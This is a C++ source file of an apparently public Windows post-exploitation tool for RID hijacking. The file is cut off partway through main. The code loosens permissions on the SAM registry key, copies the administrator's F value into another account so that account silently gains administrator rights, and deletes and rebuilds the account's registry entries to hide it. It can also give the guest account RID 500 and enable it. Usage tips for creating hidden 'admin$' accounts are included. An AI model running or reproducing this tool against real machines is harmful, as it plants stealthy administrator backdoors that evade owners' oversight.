// RidHjack.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
#include <iostream>
#include <Aclapi.h>
#include <lmcons.h>
#include <stdio.h>
#include <strsafe.h>
#include <stdlib.h>
#include <sddl.h>
#include <shlobj_core.h>
#include <time.h>
#include <math.h>
#include <LMaccess.h>
#include <LM.h>
#include <Windows.h>
#pragma comment(lib, "netapi32.lib")
#define INFO_BUFFER_SIZE (MAX_COMPUTERNAME_LENGTH + 1)

/// <summary>
/// 释放动态分配的内存
/// </summary>
/// <param name="p"></param>
void FreeOfMalloc(void* p) // free malloc
{
	if (p != NULL) { free(p); p = NULL; }
}

/// <summary>
/// 获取GetLastError详情
/// </summary>
/// <param name="Text"></param>
/// <returns></returns>
PCSTR _FormatErrorMessage(char* Text)
{
	DWORD nErrorNo = GetLastError();
	LPSTR lpBuffer;
	DWORD dwLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		nErrorNo,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language,
		(LPTSTR)&lpBuffer,
		0,
		NULL);
	if (dwLen == 0)
	{
		printf("[-] FormatMessage failed with %u\n", GetLastError());
	}
	if (lpBuffer) {
		printf("%s ErrorCode:%u  Reason:%s", Text, nErrorNo, (LPCTSTR)lpBuffer);
	}
	return 0;
}

/// <summary>
/// WCHAR 转 CHAR
/// </summary>
/// <param name="WStr"></param>
/// <returns></returns>
char* W2C(wchar_t* WStr) {
	//wchar_t* WStr = const_cast<wchar_t*>(L"string to convert");
	size_t len = wcslen(WStr) + 1;
	size_t converted = 0;
	char* CStr = NULL;
	CStr = (char*)malloc(len * sizeof(char));
	if (CStr == NULL) {
		printf("[-] W2C malloc error!\n");
	}
	else {
		wcstombs_s(&converted, CStr, len, WStr, _TRUNCATE);
	}
	return CStr;
}

/// <summary>
/// CHAR 转 WCHAR
/// </summary>
/// <param name="pszMultiByte"></param>
/// <returns></returns>
wchar_t* C2W(char* pszMultiByte) {
	int iSize;
	wchar_t* pwszUnicode = NULL;
	//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'
	iSize = MultiByteToWideChar(CP_ACP, 0, pszMultiByte, -1, NULL, 0); //iSize =wcslen(pwsUnicode)+1=6
	pwszUnicode = (wchar_t*)malloc(iSize * sizeof(wchar_t)); // 不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))
	if (pwszUnicode != NULL) {
		MultiByteToWideChar(CP_ACP, 0, pszMultiByte, -1, pwszUnicode, iSize);
	}
	else {
		printf("[-] C2W malloc error!\n");
	}
	// 转换组
	// MultiByteToWideChar(CP_ACP, 0, G, -1, Group, MultiByteToWideChar(CP_ACP, 0, G, -1, NULL, 0));
	return pwszUnicode;
}



/// <summary>
/// 检查账户是否被禁用
/// </summary>
/// <param name="U"></param>
/// <returns></returns>
BOOL IsAccountDisabled(char* U)
{
	BOOL bRet = TRUE;
	LPWSTR User = NULL;
	User = C2W(U);
	if (User == NULL) { return FALSE; }

	LPUSER_INFO_1 puiVal = NULL;
	if (NERR_Success == NetUserGetInfo(NULL, User, 1, (LPBYTE*)&puiVal))
	{
		if (!(puiVal->usri1_flags & UF_ACCOUNTDISABLE))
		{
			printf("\t\t - Account Disable Flag: enabled \n");
			bRet = FALSE;
		}
		else {
			printf("\t\t - Account Disable Flag: disabled \n");
		}
	}
	if (puiVal) { NetApiBufferFree(puiVal); }
	FreeOfMalloc(User);
	return bRet;
}

/// <summary>
/// 提升SAM注册表权限
/// </summary>
/// <returns></returns>
BOOL EnableRegSAMPriv()
{
	BOOL bRet = TRUE;
	DWORD dRet = 0;
	PACL pOldDacl = NULL, pNewDacl = NULL;
	EXPLICIT_ACCESS eia = { 0 };
	PSECURITY_DESCRIPTOR pSID = NULL;
	LPTSTR samName = const_cast<char*>("MACHINE\\SAM\\SAM"); //要修改的SAM项路径

	dRet = GetNamedSecurityInfo(samName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, &pSID); //获取SAM主键的DACL
	if (dRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}

	//创建一个ACE,允许Administrators组成员完全控制对象,并允许子对象继承此权限
	BuildExplicitAccessWithName(&eia, const_cast<char*>("Administrators"), KEY_ALL_ACCESS, SET_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);

	// 将新的ACE加入DACL
	dRet = SetEntriesInAcl(1, &eia, pOldDacl, &pNewDacl);
	if (dRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}

	// 更新SAM主键的DACL，通过 PROTECTED_DACL_SECURITY_INFORMATION 禁用继承
	dRet = SetNamedSecurityInfo(samName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
	if (dRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}

__Error_End:
	//释放DACL和SID
	if (pNewDacl) LocalFree(pNewDacl);
	if (pSID) LocalFree(pSID);

	return bRet;
}

/// <summary>
/// 恢复SAM权限为原始状态
/// </summary>
/// <returns></returns>
BOOL RecoveryRegSAMPriv()
{
	BOOL bRet = TRUE;
	DWORD dRet = 0;
	PACL pOldDacl = NULL, pNewDacl = NULL;
	EXPLICIT_ACCESS eia = { 0 };
	PSECURITY_DESCRIPTOR pSID = NULL;
	LPTSTR samName = const_cast<char*>("MACHINE\\SAM\\SAM"); //要修改的SAM项路径

	dRet = GetNamedSecurityInfo(samName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, &pSID); //获取SAM主键的DACL
	if (dRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}

	BuildExplicitAccessWithName(&eia, const_cast<char*>("Administrators"), KEY_ALL_ACCESS, SET_ACCESS, NO_INHERITANCE);

	// 将新的ACE加入DACL
	dRet = SetEntriesInAcl(1, &eia, pOldDacl, &pNewDacl);
	if (dRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}

	// 更新SAM主键的DACL
	dRet = SetNamedSecurityInfo(samName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
	if (dRet != ERROR_SUCCESS) {
		bRet = FALSE;
		goto __Error_End;
	}

__Error_End:
	//释放DACL和SID
	if (pNewDacl) LocalFree(pNewDacl);
	if (pSID) LocalFree(pSID);

	return bRet;
}

/// <summary>
/// 分割HostName和Account
/// </summary>
/// <param name="data"></param>
/// <returns></returns>
BOOL getUserinfo(LPWSTR data) {
	char* UserName = NULL;
	char* Domain = NULL;
	char* User = NULL;
	User = W2C(data);
	if (User == NULL) { return FALSE; }
	int len = 0;
	len = strlen(User);
	char* dest = (char*)malloc(sizeof(char) * len);
	if (dest == NULL) {
		return FALSE;
	}
	strcpy_s(dest, len + 1, User);
	const char s[2] = "\\";   //分隔符
	char* next_token = NULL; //缓冲区

	Domain = strtok_s(dest, s, &next_token);     //域名
	if (Domain == NULL) {
		return FALSE;
	}
	UserName = strtok_s(NULL, s, &next_token);     //域名
	if (UserName == NULL) {
		return FALSE;
	}
	//	printf("Domain:%s\n", Domain);
	//	printf("UserName:%s ", UserName);
	IsAccountDisabled(UserName);

	FreeOfMalloc(User);
	FreeOfMalloc(dest);
	return TRUE;
}


/// <summary>
/// 获取组中账户信息
/// </summary>
/// <returns></returns>
wchar_t* GetGroupUsers(char* G) {
	// LPCWSTR servername = L"\\\\127.0.0.1";				// 已经建立ipc连接的IP 用于支持横向渗透信息收集
	// LPCWSTR TargetGroup = L"Guests";				        // 本地组名
	LPWSTR TargetGroup = NULL;
	TargetGroup = C2W(G);
	if (TargetGroup == NULL) { return FALSE; }
	LOCALGROUP_MEMBERS_INFO_2* buff;			// LOCALGROUP_MEMBERS_INFO_2结构获得返回与本地组成员关联的SID、帐户信息和域名，变量buff存放获取到的信息
	DWORD dwPrefmaxlen = 1024; // MAX_PREFERRED_LENGTH;	// 指定返回数据的首选最大长度，以字节为单位。如果指定MAX_PREFERRED_LENGTH，该函数将分配数据所需的内存量。
	DWORD dwEntriesread;						// 指向一个值的指针，该值接收实际枚举的元素数。
	DWORD dwTotalentries;						//指向一个值的值，该值接收可能已从当前简历位置枚举的条目总数
	NetLocalGroupGetMembers(NULL, TargetGroup, 2, (LPBYTE*)&buff, dwPrefmaxlen, &dwEntriesread, &dwTotalentries, NULL);
	//上边的2就是函数里的等级
	fwprintf(stderr, L"[+] Group %s account:\n", TargetGroup);
	for (DWORD i = 0; i < dwEntriesread; i++) {  // i < dwEntriesread 小于收到的指针的元素数量
		//lgrmi2_domainandname是LOCALGROUP_MEMBERS_INFO_2的结构，回显DomainName\AccountName
		fwprintf(stderr, L"\t- %s\n", buff[i].lgrmi2_domainandname);
		getUserinfo(buff[i].lgrmi2_domainandname);
		// return buff[i].lgrmi2_domainandname;
	}

	FreeOfMalloc(TargetGroup);
	return FALSE;
}


/// <summary>
/// 激活账户
/// </summary>
/// <param name="U"></param>
/// <returns></returns>
BOOL EnableUser(char* U, char* P = const_cast<char*>(""), int i = 0) {
	BOOL FRT = FALSE;
	LPWSTR User = NULL;
	LPWSTR Pass = NULL;
	User = C2W(U);
	Pass = C2W(P);
	if (User == NULL) { return FRT; }
	if (Pass == NULL) { return FRT; }

	NET_API_STATUS nStatus;

	DWORD dwLevel = 1008;
	USER_INFO_1008 ui;
	ui.usri1008_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;   // 启用 


	USER_INFO_2 uinfo2;
	dwLevel = 2;
	ZeroMemory(&uinfo2, sizeof(uinfo2));
	uinfo2.usri2_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;      // 执行的登录脚本。必须设置此值。
	uinfo2.usri2_acct_expires = TIMEQ_FOREVER;                   // 解决账户过期问题。

	if (i) {
		uinfo2.usri2_password = Pass;                                // 设置密码
		uinfo2.usri2_workstations = NULL;
	}

	nStatus = NetUserSetInfo(NULL,
		User,
		dwLevel,
		(LPBYTE)&uinfo2,
		NULL);
	switch (nStatus)
	{
	case NERR_Success:
	{
		fprintf(stderr, "[+] User account %s has been enabled \n", U);
		FRT = TRUE;
		break;
	}
	case ERROR_ACCESS_DENIED:
	{
		fprintf(stderr, "[-] 用户无权访问所请求的信息。\n");
		break;
	}
	case ERROR_INVALID_PARAMETER:
	{
		fprintf(stderr, "[-] 函数参数之一无效。有关详细信息，请参阅以下备注部分。\n");
		break;
	}
	case NERR_InvalidComputer:
	{
		fprintf(stderr, "[-] 计算机名称无效。\n");
		break;
	}
	case NERR_NotPrimary:
	{
		fprintf(stderr, "[-] 该操作只允许在域的主域控制器上进行。\n");
		break;
	}
	case NERR_SpeGroupOp:
	{
		fprintf(stderr, "[-] 不允许对指定的特殊组进行操作，即用户组、管理员组、本地组或来宾组。\n");
		break;
	}
	case NERR_LastAdmin:
	{
		fprintf(stderr, "[-] 最后一个管理帐户不允许该操作。\n");
		break;
	}
	case NERR_BadPassword:
	{
		fprintf(stderr, "[-] 共享名或密码无效。\n");
		break;
	}
	case NERR_PasswordTooShort:
	{
		fprintf(stderr, "[-] 密码比要求的短。（密码也可能太长、更改历史记录太新、没有足够的唯一字符或不满足其他密码策略要求。）\n");
		break;
	}
	case NERR_UserNotFound:
	{
		fprintf(stderr, "[-] 找不到用户名\n");
		break;
	}
	default:
		fprintf(stderr, "[-] A system error has occurred: %d\n", nStatus);
		break;
	}

	FreeOfMalloc(User);
	FreeOfMalloc(Pass);
	return FRT;
}


/// <summary>
/// 删除用户
/// </summary>
/// <param name="U"></param>
/// <returns></returns>
BOOL DelUser(char* U) {
	BOOL FRT = FALSE;
	DWORD dwError = 0;
	LPWSTR User = NULL;
	User = C2W(U);
	if (User == NULL) { return FRT; }
	NET_API_STATUS nStatus;

	nStatus = NetUserDel(NULL, User);
	switch (nStatus)
	{
	case NERR_Success:
	{
		fprintf(stderr, "[+] User %s has been successfully deleted.\n", U);
		FRT = TRUE;
		break;

	}
	case ERROR_ACCESS_DENIED:
	{
		fprintf(stderr, "[-] 用户无权访问所请求的信息。\n"); break;
	}
	case NERR_InvalidComputer:
	{
		fprintf(stderr, "[-] 计算机名称无效。\n"); break;
	}
	case NERR_NotPrimary:
	{
		fprintf(stderr, "[-] 该操作只允许在域的主域控制器上进行。\n"); break;
	}
	case NERR_UserNotFound:
	{
		fprintf(stderr, "[-] 找不到用户名。\n"); break;
	}
	default:
		fprintf(stderr, "[-] A system error has occurred: %d\n", nStatus);
		break;
	}

	FreeOfMalloc(User);
	return FRT;
}




/// <summary>
/// 劫持RID
/// </summary>
/// <param name="typeadmin"></param>
/// <param name="typeuser"></param>
/// <param name="User"></param>
/// <param name="SrcTYPE_User"></param>
/// <returns></returns>
BOOL GetFval(char* typeadmin, char* typeuser, char* User, char* Pass, DWORD SrcTYPE_User) {
	// EnableRegSAMPriv();
	BOOL FunRt = FALSE;

	DWORD RT;
	DWORD RT_ForcePasswordReset;

	int exit_ForcePasswordReset = 1;

	BYTE Buffer_F[0x50] = { 0 };
	BYTE Buffer_ForcePasswordReset[0x04] = { 0 };
	// BYTE Buffer_SupplementalCredentials[0x4E0] = { 0 };  // 不需要该键值
	BYTE Buffer_V[0x6FF] = { 0 };

	DWORD KeySize_F = sizeof(Buffer_F);
	DWORD KeySize_ForcePasswordReset = sizeof(Buffer_ForcePasswordReset);
	// DWORD KeySize_SupplementalCredentials = sizeof(Buffer_SupplementalCredentials);
	DWORD KeySize_V = sizeof(Buffer_V);

	DWORD KeyType;

	HKEY hKey = NULL;
	HKEY hKey2 = NULL;
	HKEY hKey3 = NULL;
	PCHAR KeyAddr_Regadmin = NULL;
	PCHAR KeyAddr_Reguser = NULL;
	PCHAR KeyAddr_User_Names = NULL;

	char* Regadmin = NULL;
	char* Reguser = NULL;
	char* Reguser_Names = NULL;


	char* RootReg = const_cast <char*>("SAM\\SAM\\Domains\\Account\\Users\\");
	// 拼接管理员
	int conunt = strlen(RootReg) + strlen(typeadmin);
	Regadmin = (char*)malloc((conunt + 1) * sizeof(char*));
	if (Regadmin == NULL) {
		return FALSE;
	}
	memset(Regadmin, 0, (conunt + 1) * sizeof(char*));
	strcat_s(Regadmin, strlen(RootReg) + 1, RootReg);
	strcat_s(Regadmin, conunt + 1, typeadmin);

	// 拼接普通用户
	int conunt_1 = strlen(RootReg) + strlen(typeuser);
	Reguser = (char*)malloc((conunt_1 + 1) * sizeof(char*));
	if (Reguser == NULL) {
		FreeOfMalloc(Regadmin);
		return FALSE;
	}
	memset(Reguser, 0, (conunt_1 + 1) * sizeof(char*));
	strcat_s(Reguser, strlen(RootReg) + 1, RootReg);
	strcat_s(Reguser, conunt_1 + 1, typeuser);

	//拼接Names项
	char* RootNames = const_cast <char*>("SAM\\SAM\\Domains\\Account\\Users\\Names\\");
	int conunt_2 = strlen(RootNames) + strlen(User);
	Reguser_Names = (char*)malloc((conunt_2 + 1) * sizeof(char*));
	if (Reguser_Names == NULL) {
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		return FALSE;
	}
	memset(Reguser_Names, 0, (conunt_2 + 1) * sizeof(char*));
	strcat_s(Reguser_Names, strlen(RootNames) + 1, RootNames);
	strcat_s(Reguser_Names, conunt_2 + 1, User);

	KeyAddr_Regadmin = (PCHAR)Regadmin;           // 管理员键
	KeyAddr_Reguser = (PCHAR)Reguser;             // 要覆盖的键  
	KeyAddr_User_Names = (PCHAR)Reguser_Names;

	printf("[*] Regadmin:\t%s\n", KeyAddr_Regadmin);
	printf("[*] Reguser:\t%s\n", KeyAddr_Reguser);

	if (lstrcmpiA(User, "guest") == 0) {
		printf("[*] Account is %s. Only change F keyval. \n", User);

		if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr_Reguser, 0, KEY_ALL_ACCESS, &hKey2)) {
			printf("[-] KeyAddr_Reguser:%s\n", KeyAddr_Reguser);
		}
		else {
			RT = RegGetValueA(hKey2, NULL, "F", RRF_RT_REG_BINARY, &KeyType, (LPBYTE)Buffer_F, &KeySize_F);
			switch (RT) {
			case ERROR_SUCCESS: {
				printf("[+] F Final buffer size is %d\n", KeySize_F);
				Buffer_F[0x30] = (BYTE)0xf4; //hijack rid
				Buffer_F[0x38] = (BYTE)0x14; //enable guest

				if (ERROR_SUCCESS != RegSetValueExA(hKey2, "F", NULL, KeyType, Buffer_F, KeySize_F)) {
					printf("[-] RegSetValueExA error!\n");
				}
				else {
					if (EnableUser(User, Pass, 1)) {
						printf("[+] Set Account guest info successfully\n");
						FunRt = TRUE;
					}
				}
				RegCloseKey(hKey2);
				break;
			}
			case ERROR_MORE_DATA: {
				printf("[*] F Final buffer size is %d\n", KeySize_F);
				printf("[*] Buffer_F size is %d\n", sizeof(Buffer_F));
				printf("[-] F lpData缓冲区太小\n");
				break;
			}
			case ERROR_FILE_NOT_FOUND: {
				printf("[-] F lpValueName注册表值不存在\n");
				break;
			}
			default:
			{
				printf("[-] F RegQueryValueEx failed (%d)\n", RT);
				break;
			}
			}
		}

		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FunRt;
	}


	//----------------------------
	if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr_Regadmin, 0, KEY_ALL_ACCESS, &hKey)) {
		printf("[-] KeyAddr_Regadmin:%s\n", KeyAddr_Regadmin);
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr_Reguser, 0, KEY_ALL_ACCESS, &hKey2)) {
		printf("[-] KeyAddr_Reguser:%s\n", KeyAddr_Reguser);
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr_User_Names, 0, KEY_ALL_ACCESS, &hKey3)) {
		printf("[-] KeyAddr_User_Names:%s\n", KeyAddr_User_Names);
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	RT = RegGetValueA(hKey, NULL, "F", RRF_RT_REG_BINARY, &KeyType, (LPBYTE)Buffer_F, &KeySize_F);
	switch (RT) {
	case ERROR_SUCCESS: {
		printf("[*] F Final buffer size is %d\n", KeySize_F);
		// Buffer[0x0030] = (BYTE)0x01f4; // hijack rid
		// Buffer[0x0038] = (BYTE)0x14; // enable guest
		break;
	}
	case ERROR_MORE_DATA: {
		printf("[*] F Final buffer size is %d\n", KeySize_F);
		printf("[*] Buffer_F size is %d\n", sizeof(Buffer_F));
		printf("[-] F lpData缓冲区太小\n");
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
		break;
	}
	case ERROR_FILE_NOT_FOUND: {
		printf("[-] F lpValueName注册表值不存在\n");
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
		break;
	}
	default:
	{
		printf("[-] F RegQueryValueEx failed (%d)\n", RT);
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
		break;
	}
	}

	RT_ForcePasswordReset = RegQueryValueExA(hKey2, "ForcePasswordReset", NULL, &KeyType, (LPBYTE)Buffer_ForcePasswordReset, &KeySize_ForcePasswordReset);
	switch (RT_ForcePasswordReset) {
	case ERROR_SUCCESS: {
		printf("[*] ForcePasswordReset Final buffer size is %d\n", KeySize_F);
		// Buffer[0x0030] = (BYTE)0x01f4; // hijack rid
		// Buffer[0x0038] = (BYTE)0x14; // enable guest
		break;
	}
	case ERROR_MORE_DATA: {
		printf("[-] ForcePasswordReset buffer size is %d\n", sizeof(Buffer_ForcePasswordReset));
		printf("[-] ForcePasswordReset size is %d\n", KeySize_ForcePasswordReset);
		printf("[-] ForcePasswordReset lpData缓冲区太小\n");
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
		break;
	}
	case ERROR_FILE_NOT_FOUND: {
		//  Server2008 、Guest not has ForcePasswordReset;
		printf("[*] ForcePasswordReset lpValueName注册表值不存在. \n");
		exit_ForcePasswordReset = 0;
		break;
	}
	default:
	{
		printf("[-] ForcePasswordReset RegQueryValueEx failed (%d)\n", RT_ForcePasswordReset);
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
		break;
	}
	}

	/* if (ERROR_SUCCESS != RegQueryValueExA(hKey2, "SupplementalCredentials", NULL, &KeyType, (LPBYTE)Buffer_SupplementalCredentials, &KeySize_SupplementalCredentials)) {
		printf("[-] SupplementalCredentials buffer size is %d\n", sizeof(Buffer_SupplementalCredentials));
		printf("[-] SupplementalCredentials size is %d\n", KeySize_SupplementalCredentials);
		return FALSE;
	}*/

	if (ERROR_SUCCESS != RegQueryValueExA(hKey2, "V", NULL, &KeyType, (LPBYTE)Buffer_V, &KeySize_V)) {
		printf("[-] V\n");
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}


	DWORD SrcTYPE;
	BYTE Buffer[0x50] = { 0 };
	DWORD KeySize = sizeof(Buffer);
	if (ERROR_SUCCESS != RegQueryValueExA(hKey3, NULL, NULL, &SrcTYPE, (LPBYTE)Buffer, &KeySize)) {
		printf("[-] RegQueryValueExA error!\n");
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	// 删除用户:
	if (!DelUser(User)) {
		printf("[-] 用户删除失败！\n");
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	//恢复USERS
	HKEY hkSub = NULL;
	DWORD dwDisposition;
	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_LOCAL_MACHINE, KeyAddr_Reguser, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkSub, &dwDisposition)) {
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}
	if (ERROR_SUCCESS != RegSetValueExA(hkSub, "F", NULL, KeyType, Buffer_F, 0x50)) {
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	if (exit_ForcePasswordReset) {
		if (ERROR_SUCCESS != RegSetValueExA(hkSub, "ForcePasswordReset", NULL, KeyType, Buffer_ForcePasswordReset, KeySize_ForcePasswordReset)) {
			FreeOfMalloc(Regadmin);
			FreeOfMalloc(Reguser);
			FreeOfMalloc(Reguser_Names);
			return FALSE;
		}
	}

	/*if (ERROR_SUCCESS != RegSetValueExA(hkSub, "SupplementalCredentials", NULL, KeyType, Buffer_SupplementalCredentials, KeySize_SupplementalCredentials)) {
		return FALSE;
	}*/

	if (ERROR_SUCCESS != RegSetValueExA(hkSub, "V", NULL, KeyType, Buffer_V, KeySize_V)) {
		FreeOfMalloc(Regadmin);
		FreeOfMalloc(Reguser);
		FreeOfMalloc(Reguser_Names);
		return FALSE;
	}

	//恢复NAMES
	HKEY hkSubName = NULL;
	DWORD dwDispositionN;
	printf("[*] Names KeyAddr: %s\n", KeyAddr_User_Names);
	if (ERROR_SUCCESS == RegCreateKeyExA(HKEY_LOCAL_MACHINE, KeyAddr_User_Names, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkSubName, &dwDispositionN)) {
		if (ERROR_SUCCESS == RegSetValueExA(hkSubName, NULL, NULL, SrcTYPE, Buffer, KeySize)) {
			RegCloseKey(hkSubName);
			// printf("[+] NAME KeySize size is %d\n", KeySize);
			// printf("[+] NAME Buffer size is %d\n", sizeof(Buffer));
			printf("[*] Account %s control flags:", User);
			if (IsAccountDisabled(User)) {
				if (EnableUser(User)) {
					printf("[+] 成功~~ 撒花！\n");
				}
				else {
					FreeOfMalloc(Regadmin);
					FreeOfMalloc(Reguser);
					FreeOfMalloc(Reguser_Names);
					return FALSE;
				}
			}
			else {
				printf("[+] 成功~~ 撒花！\n");
			}

			FreeOfMalloc(Regadmin);
			FreeOfMalloc(Reguser);
			FreeOfMalloc(Reguser_Names);
			return TRUE;
		}
		else {
			printf("[-] RegSetValueExA NAMES Error!\n");
		}
	}
	else {
		printf("[-] RegCreateKeyEx Faied!\n");
	}
	RegCloseKey(hKey);
	RegCloseKey(hKey2);

	FreeOfMalloc(Regadmin);
	FreeOfMalloc(Reguser);
	FreeOfMalloc(Reguser_Names);
	return FALSE;
}



/// <summary>
///  获取用户注册表类型
/// </summary>
/// <param name="U">用户名</param>
/// <param name="KeyTypeC">字符串形式的键类型</param>
/// <param name="SrcTYPE">DWORD类型的键类型</param>
/// <returns></returns>
BOOL GetUtype(char* U, char* KeyTypeC, DWORD SrcTYPE) {
	BOOL Sta = FALSE;
	DWORD dwRet = 0;
	HKEY hKey = NULL;
	PCHAR KeyAddr = NULL;
	DWORD KeySize = 0;
	BYTE Buffer[0x10] = { 0 };
	// CHAR KeyTypeC[10];
	char text[100] = "SAM\\SAM\\Domains\\Account\\Users\\Names\\";
	strcat_s(text, sizeof(text), U);
	KeyAddr = (PCHAR)text;  // 用户的键  RegOpenKeyEx


	NET_API_STATUS nStatus;
	LPUSER_INFO_0 pBuf = NULL;
	LPWSTR User = NULL;
	User = C2W(U);
	if (User == NULL) { return Sta; }
	nStatus = NetUserGetInfo(NULL, User, 1, (LPBYTE*)&pBuf);
	switch (nStatus)
	{
	case ERROR_ACCESS_DENIED: {
		fprintf(stderr, "[-] 用户无权访问所请求的信息。\n");
		break;
	}
	case ERROR_BAD_NETPATH: {
		fprintf(stderr, "[-] 找不到servername参数中 指定的网络路径。\n");
		break;
	}
	case ERROR_INVALID_LEVEL: {
		fprintf(stderr, "[-] 为level参数指定的值无效。\n");
		break;
	}
	case NERR_InvalidComputer: {
		fprintf(stderr, "[-] 计算机名称无效。\n");
		break;
	}
	case NERR_UserNotFound: {
		fprintf(stderr, "[-] 找不到用户名: %s \n", U);
		break;
	}
	case NERR_Success: {
		if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr, 0, KEY_ALL_ACCESS, &hKey)) {
			printf("[-] RegOpenKeyExA %s error . Please confirm the key value exists!\n", text);
			_FormatErrorMessage(const_cast<char*>("\t"));
			break;
		}

		// 只获取键的类型，16进制的SID值
		if (ERROR_SUCCESS != RegQueryValueExA(hKey, NULL, NULL, &SrcTYPE, (LPBYTE)&Buffer, &KeySize)) {
			printf("[-] RegQueryValueExA %s error\n", text);
			break;
		}
		sprintf_s(KeyTypeC, 10, "%08x", SrcTYPE);
		if (KeyTypeC == NULL) {
			printf("[-] sprintf_s error!\n");
			break;
		}
		printf("[*] Confirm account %s REG TYPE : %s\n", U, KeyTypeC);
		Sta = TRUE;
		break;
	}
	}
	if (pBuf) { NetApiBufferFree(pBuf); }

	FreeOfMalloc(User);
	return Sta;
}


//新建用户设置密码，复制管理员的F值到该用户F值，保存该用户注册表信息，删除该用户，恢复注册表。
BOOL main(int argc, char* argv[]) {
	if (argc < 2) { return FALSE; } else { if (lstrcmpiA(argv[0], "RidHelper.exe") != 0) { return FALSE; } }

	clock_t start, end;
	start = clock();

	char* UserName = NULL;
	char* Domain = NULL;
	CHAR infoBuf[INFO_BUFFER_SIZE];
	DWORD bufCharCount = INFO_BUFFER_SIZE;
	if (GetComputerName(infoBuf, &bufCharCount)) {
		printf("[*] NetBIOS name of the local computer is: %s \n", infoBuf);
	}
	else {
		printf("[-] Get NetBIOS name failed with error %lu \n", GetLastError());
	}

	char curname[1024];
	DWORD curnameLength = sizeof(curname);
	if (0 != GetUserName(curname, &curnameLength)) {
		printf("[*] Current User is: %s \n", curname);
	}
	else {
		printf("[-] GetUserName failed with error %lu \n", GetLastError());
	}
	printf("\n[*] Github: https://github.com/yanghaoi/ridhijack \n");
	printf("[!] Against using it illegally! \n");

	if (argc < 3) {
		// 查找本地管理员组的用户
		printf("\n[*] =======================Tips=======================\n");
		printf("\t New Account: net user admin$ 123 /ad \n");
		printf("\t RID HiJack(use admin$): %s administrator admin$ \n", argv[0]);
		printf("\t RID HiJack(use guest): %s administrator guest newpass \n", argv[0]);
		printf("[*] =======================Tips=======================\n\n");

		printf("[*] Scanning administrators group ...\n");
		GetGroupUsers(const_cast <char*>("administrators"));
	}
	else {
		// 提供了管理员账户
		// printf("%d,%s,%s,%s", argc, argv[0], argv[1], argv[2]);
		UserName = argv[1];

		printf("[*] Administrative permissions required. Detecting permissions...\n");
		//检查当前用户是否为管理员组成员
		if (IsUserAnAdmin()) {
			printf("[+] Success: Administrative permissions confirmed.\n");
			//先把注册表权限设置为管理员完全控制
			if (EnableRegSAMPriv()) {
				printf("[+] Enable SAM Priv Success.\n");
				// 通过读取SAM注册表中 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator 的类型获得在USERS中的子项名
				char Uktypeofadmin[10] = { 0 };
				DWORD SrcTYPE_admin = 0;
